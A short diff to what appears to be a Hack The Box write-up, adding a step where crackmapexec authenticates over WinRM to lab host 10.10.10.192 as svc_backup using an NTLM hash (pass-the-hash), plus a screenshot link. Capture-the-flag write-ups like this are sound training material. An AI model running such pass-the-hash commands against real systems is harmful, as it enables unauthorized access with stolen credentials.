@@ -166,4 +166,10 @@ rpcclient $> exit
 
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/abfc08ef-f1ce-4810-b158-7d8a89c8f53a)
+```
+▶ crackmapexec winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ee122af8-bdde-4e8d-bbb4-7c3208280597)
+
+---
 
